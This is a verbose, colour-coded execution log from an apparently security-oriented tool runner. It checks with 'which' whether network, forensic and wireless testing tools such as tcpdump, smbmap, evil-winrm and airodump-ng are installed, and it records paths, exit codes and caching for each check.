2025-10-24 01:26:45,527 - __main__ - INFO - 🆔 REGISTERED: Process 43423 - which anew...
2025-10-24 01:26:45,529 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43423
2025-10-24 01:26:45,531 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/anew
2025-10-24 01:26:45,534 - __main__ - INFO - 🧹 CLEANUP: Process 43423 removed from registry
2025-10-24 01:26:45,534 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,535 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,535 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,535 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,535 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which anew
2025-10-24 01:26:45,535 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,535 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 01:26:45,535 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,535 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,535 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,535 - __main__ - INFO - 💾 Cached result for command: which anew
2025-10-24 01:26:45,535 - __main__ - INFO - 🔍 Cache MISS for command: which qsreplace
2025-10-24 01:26:45,535 - __main__ - INFO - 🚀 EXECUTING: which qsreplace
2025-10-24 01:26:45,535 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,535 - __main__ - INFO - 🆔 PROCESS: PID 43428 started
2025-10-24 01:26:45,535 - __main__ - INFO - 🆔 REGISTERED: Process 43428 - which qsreplace...
2025-10-24 01:26:45,536 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43428
2025-10-24 01:26:45,538 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/qsreplace
2025-10-24 01:26:45,540 - __main__ - INFO - 🧹 CLEANUP: Process 43428 removed from registry
2025-10-24 01:26:45,541 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,541 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,541 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,541 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,541 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which qsreplace
2025-10-24 01:26:45,541 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,541 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 25 bytes
2025-10-24 01:26:45,541 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,541 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,541 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,541 - __main__ - INFO - 💾 Cached result for command: which qsreplace
2025-10-24 01:26:45,541 - __main__ - INFO - 🔍 Cache MISS for command: which uro
2025-10-24 01:26:45,541 - __main__ - INFO - 🚀 EXECUTING: which uro
2025-10-24 01:26:45,541 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,541 - __main__ - INFO - 🆔 PROCESS: PID 43433 started
2025-10-24 01:26:45,541 - __main__ - INFO - 🆔 REGISTERED: Process 43433 - which uro...
2025-10-24 01:26:45,542 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43433
2025-10-24 01:26:45,544 - __main__ - INFO - 🧹 CLEANUP: Process 43433 removed from registry
2025-10-24 01:26:45,544 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:45,544 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,544 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,544 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,544 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which uro
2025-10-24 01:26:45,544 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,544 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,544 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,544 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,544 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,544 - __main__ - INFO - 🔍 Cache MISS for command: which kismet
2025-10-24 01:26:45,544 - __main__ - INFO - 🚀 EXECUTING: which kismet
2025-10-24 01:26:45,544 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,544 - __main__ - INFO - 🆔 PROCESS: PID 43438 started
2025-10-24 01:26:45,545 - __main__ - INFO - 🆔 REGISTERED: Process 43438 - which kismet...
2025-10-24 01:26:45,545 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43438
2025-10-24 01:26:45,547 - __main__ - INFO - 📤 STDOUT: /usr/bin/kismet
2025-10-24 01:26:45,550 - __main__ - INFO - 🧹 CLEANUP: Process 43438 removed from registry
2025-10-24 01:26:45,550 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,550 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,550 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,550 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,550 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which kismet
2025-10-24 01:26:45,550 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,550 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,550 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,550 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,550 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,550 - __main__ - INFO - 💾 Cached result for command: which kismet
2025-10-24 01:26:45,550 - __main__ - INFO - 🔍 Cache MISS for command: which wireshark
2025-10-24 01:26:45,550 - __main__ - INFO - 🚀 EXECUTING: which wireshark
2025-10-24 01:26:45,550 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,550 - __main__ - INFO - 🆔 PROCESS: PID 43443 started
2025-10-24 01:26:45,550 - __main__ - INFO - 🆔 REGISTERED: Process 43443 - which wireshark...
2025-10-24 01:26:45,551 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43443
2025-10-24 01:26:45,554 - __main__ - INFO - 📤 STDOUT: /usr/bin/wireshark
2025-10-24 01:26:45,557 - __main__ - INFO - 🧹 CLEANUP: Process 43443 removed from registry
2025-10-24 01:26:45,557 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,557 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,557 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,557 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,557 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which wireshark
2025-10-24 01:26:45,557 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,557 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:45,557 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,557 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,557 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,557 - __main__ - INFO - 💾 Cached result for command: which wireshark
2025-10-24 01:26:45,557 - __main__ - INFO - 🔍 Cache MISS for command: which tshark
2025-10-24 01:26:45,557 - __main__ - INFO - 🚀 EXECUTING: which tshark
2025-10-24 01:26:45,557 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,558 - __main__ - INFO - 🆔 PROCESS: PID 43448 started
2025-10-24 01:26:45,558 - __main__ - INFO - 🆔 REGISTERED: Process 43448 - which tshark...
2025-10-24 01:26:45,558 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43448
2025-10-24 01:26:45,560 - __main__ - INFO - 📤 STDOUT: /usr/bin/tshark
2025-10-24 01:26:45,563 - __main__ - INFO - 🧹 CLEANUP: Process 43448 removed from registry
2025-10-24 01:26:45,563 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,563 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,563 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,563 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,563 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which tshark
2025-10-24 01:26:45,563 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,563 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,563 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,563 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,563 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,563 - __main__ - INFO - 💾 Cached result for command: which tshark
2025-10-24 01:26:45,563 - __main__ - INFO - 🔍 Cache MISS for command: which tcpdump
2025-10-24 01:26:45,563 - __main__ - INFO - 🚀 EXECUTING: which tcpdump
2025-10-24 01:26:45,563 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,564 - __main__ - INFO - 🆔 PROCESS: PID 43453 started
2025-10-24 01:26:45,564 - __main__ - INFO - 🆔 REGISTERED: Process 43453 - which tcpdump...
2025-10-24 01:26:45,564 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43453
2025-10-24 01:26:45,566 - __main__ - INFO - 📤 STDOUT: /usr/bin/tcpdump
2025-10-24 01:26:45,566 - __main__ - INFO - 🧹 CLEANUP: Process 43453 removed from registry
2025-10-24 01:26:45,566 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,566 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,566 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,566 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,566 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which tcpdump
2025-10-24 01:26:45,566 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,567 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,567 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,567 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,567 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,567 - __main__ - INFO - 💾 Cached result for command: which tcpdump
2025-10-24 01:26:45,567 - __main__ - INFO - 🔍 Cache MISS for command: which smbmap
2025-10-24 01:26:45,567 - __main__ - INFO - 🚀 EXECUTING: which smbmap
2025-10-24 01:26:45,567 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,567 - __main__ - INFO - 🆔 PROCESS: PID 43458 started
2025-10-24 01:26:45,567 - __main__ - INFO - 🆔 REGISTERED: Process 43458 - which smbmap...
2025-10-24 01:26:45,568 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43458
2025-10-24 01:26:45,570 - __main__ - INFO - 📤 STDOUT: /usr/bin/smbmap
2025-10-24 01:26:45,572 - __main__ - INFO - 🧹 CLEANUP: Process 43458 removed from registry
2025-10-24 01:26:45,572 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,572 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,572 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,572 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,572 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which smbmap
2025-10-24 01:26:45,572 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,572 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,572 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,572 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,572 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,572 - __main__ - INFO - 💾 Cached result for command: which smbmap
2025-10-24 01:26:45,572 - __main__ - INFO - 🔍 Cache MISS for command: which sleuthkit
2025-10-24 01:26:45,572 - __main__ - INFO - 🚀 EXECUTING: which sleuthkit
2025-10-24 01:26:45,572 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,573 - __main__ - INFO - 🆔 PROCESS: PID 43463 started
2025-10-24 01:26:45,573 - __main__ - INFO - 🆔 REGISTERED: Process 43463 - which sleuthkit...
2025-10-24 01:26:45,573 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43463
2025-10-24 01:26:45,578 - __main__ - INFO - 🧹 CLEANUP: Process 43463 removed from registry
2025-10-24 01:26:45,578 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:45,578 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,578 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,578 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,578 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which sleuthkit
2025-10-24 01:26:45,578 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,578 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,578 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,578 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,578 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,578 - __main__ - INFO - 🔍 Cache MISS for command: which autopsy
2025-10-24 01:26:45,578 - __main__ - INFO - 🚀 EXECUTING: which autopsy
2025-10-24 01:26:45,578 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,578 - __main__ - INFO - 🆔 PROCESS: PID 43468 started
2025-10-24 01:26:45,578 - __main__ - INFO - 🆔 REGISTERED: Process 43468 - which autopsy...
2025-10-24 01:26:45,579 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43468
2025-10-24 01:26:45,581 - __main__ - INFO - 📤 STDOUT: /usr/bin/autopsy
2025-10-24 01:26:45,584 - __main__ - INFO - 🧹 CLEANUP: Process 43468 removed from registry
2025-10-24 01:26:45,584 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,584 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,584 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,584 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,584 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which autopsy
2025-10-24 01:26:45,584 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,584 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,584 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,584 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,584 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,584 - __main__ - INFO - 💾 Cached result for command: which autopsy
2025-10-24 01:26:45,584 - __main__ - INFO - 🔍 Cache MISS for command: which evil-winrm
2025-10-24 01:26:45,584 - __main__ - INFO - 🚀 EXECUTING: which evil-winrm
2025-10-24 01:26:45,584 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,585 - __main__ - INFO - 🆔 PROCESS: PID 43473 started
2025-10-24 01:26:45,585 - __main__ - INFO - 🆔 REGISTERED: Process 43473 - which evil-winrm...
2025-10-24 01:26:45,586 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43473
2025-10-24 01:26:45,587 - __main__ - INFO - 📤 STDOUT: /usr/bin/evil-winrm
2025-10-24 01:26:45,590 - __main__ - INFO - 🧹 CLEANUP: Process 43473 removed from registry
2025-10-24 01:26:45,590 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,590 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,590 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,590 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,590 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which evil-winrm
2025-10-24 01:26:45,590 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,590 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 01:26:45,590 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,590 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,590 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,590 - __main__ - INFO - 💾 Cached result for command: which evil-winrm
2025-10-24 01:26:45,594 - __main__ - INFO - 💾 Cache HIT for command: which paramspider
2025-10-24 01:26:45,594 - __main__ - INFO - 🔍 Cache MISS for command: which airmon-ng
2025-10-24 01:26:45,594 - __main__ - INFO - 🚀 EXECUTING: which airmon-ng
2025-10-24 01:26:45,594 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,595 - __main__ - INFO - 🆔 PROCESS: PID 43478 started
2025-10-24 01:26:45,595 - __main__ - INFO - 🆔 REGISTERED: Process 43478 - which airmon-ng...
2025-10-24 01:26:45,595 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43478
2025-10-24 01:26:45,609 - __main__ - INFO - 📤 STDOUT: /usr/sbin/airmon-ng
2025-10-24 01:26:45,615 - __main__ - INFO - 🧹 CLEANUP: Process 43478 removed from registry
2025-10-24 01:26:45,615 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.02s
2025-10-24 01:26:45,615 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,615 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,615 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,615 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which airmon-ng
2025-10-24 01:26:45,615 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.02s
2025-10-24 01:26:45,615 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 01:26:45,615 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,615 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,615 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,615 - __main__ - INFO - 💾 Cached result for command: which airmon-ng
2025-10-24 01:26:45,615 - __main__ - INFO - 🔍 Cache MISS for command: which airodump-ng
2025-10-24 01:26:45,615 - __main__ - INFO - 🚀 EXECUTING: which airodump-ng
2025-10-24 01:26:45,615 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,615 - __main__ - INFO - 🆔 PROCESS: PID 43483 started
2025-10-24 01:26:45,616 - __main__ - INFO - 🆔 REGISTERED: Process 43483 - which airodump-ng...
2025-10-24 01:26:45,617 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43483
2025-10-24 01:26:45,619 - __main__ - INFO - 📤 STDOUT: /usr/sbin/airodump-ng
2025-10-24 01:26:45,621 - __main__ - INFO - 🧹 CLEANUP: Process 43483 removed from registry
2025-10-24 01:26:45,621 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,621 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,621 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,621 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,621 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which airodump-ng
2025-10-24 01:26:45,621 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,621 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 01:26:45,621 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,621 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,621 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,621 - __main__ - INFO - 💾 Cached result for command: which airodump-ng
2025-10-24 01:26:45,621 - __main__ - INFO - 🔍 Cache MISS for command: which aireplay-ng
2025-10-24 01:26:45,621 - __main__ - INFO - 🚀 EXECUTING: which aireplay-ng
2025-10-24 01:26:45,621 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,622 - __main__ - INFO - 🆔 PROCESS: PID 43488 started
2025-10-24 01:26:45,622 - __main__ - INFO - 🆔 REGISTERED: Process 43488 - which aireplay-ng...
2025-10-24 01:26:45,622 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43488
2025-10-24 01:26:45,624 - __main__ - INFO - 📤 STDOUT: /usr/sbin/aireplay-ng
2025-10-24 01:26:45,628 - __main__ - INFO - 🧹 CLEANUP: Process 43488 removed from registry
2025-10-24 01:26:45,628 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,628 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,628 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,628 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,628 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which aireplay-ng
2025-10-24 01:26:45,628 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,628 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 01:26:45,628 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,628 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,628 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,628 - __main__ - INFO - 💾 Cached result for command: which aireplay-ng
